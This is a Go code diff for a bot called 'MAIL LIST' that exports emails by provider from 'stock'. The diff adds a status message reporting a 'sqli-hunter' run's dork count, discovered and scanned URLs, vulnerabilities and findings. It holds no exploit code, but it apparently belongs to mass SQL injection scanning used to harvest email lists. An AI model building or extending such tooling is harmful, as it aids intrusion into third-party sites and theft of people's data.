@@ -1,6 +1,11 @@
 package bot
 
-import "fmt"
+import (
+	"fmt"
+	"strings"
+
+	"github.com/sqli-hunter/sqli-hunter/internal/results"
+)
 
 const nameEN = "MAIL LIST"
 
@@ -28,6 +33,7 @@ var en = Texts{
 	ProviderLabel: enProviderLabel,
 	CallbackDenied: enCallbackDenied,
 	CallbackEmpty:  enCallbackEmpty,
+	Status:         enStatus,
 }
 
 func enWelcome(stock string) string {
@@ -63,7 +69,7 @@ func enInvalidQty(provider string) string {
 }
 
 func enHint() string {
-	return "👆 Type /start then pick a provider."
+	return "👆 /start — export emails\n📊 /status — daily progress"
 }
 
 func enDelivery(emoji, provider string, count int) string {
@@ -95,3 +101,31 @@ func enProviderLabel(emoji, provider string, count int) string {
 
 func enCallbackDenied() string { return "🚫 Access denied" }
 func enCallbackEmpty() string  { return "📭 Empty stock" }
+
+func enStatus(scopeN, scannedN int, st results.RunStatus, updatedAgo string) string {
+	var b strings.Builder
+	b.WriteString("📊 *sqli-hunter progress*\n")
+	if updatedAgo != "" {
+		b.WriteString(fmt.Sprintf("_updated %s ago_\n", updatedAgo))
+	}
+	b.WriteString(fmt.Sprintf("phase: *%s*\n", st.Phase))
+	if st.DorkTotal > 0 {
+		b.WriteString(fmt.Sprintf("dorks: %d/%d\n", st.DorkIndex, st.DorkTotal))
+	} else if st.DiscoverPage > 0 {
+		b.WriteString(fmt.Sprintf("discover page: %d\n", st.DiscoverPage))
+	}
+	if st.URLsKept > 0 || st.URLsFetched > 0 {
+		b.WriteString(fmt.Sprintf("discover: %d kept · %d fetched", st.URLsKept, st.URLsFetched))
+		if st.URLsSkipped > 0 {
+			b.WriteString(fmt.Sprintf(" · %d skipped", st.URLsSkipped))
+		}
+		b.WriteString("\n")
+	}
+	if st.ScanTotal > 0 || st.Scanned > 0 {
+		b.WriteString(fmt.Sprintf("scan: %d/%d · %d vulns · %d findings\n",
+			st.Scanned, st.ScanTotal, st.Vulns, st.Findings))
+	}
+	b.WriteString(fmt.Sprintf("scope_daily: *%d* URLs\n", scopeN))
+	b.WriteString(fmt.Sprintf("already scanned: *%d*", scannedN))
+	return b.String()
+}
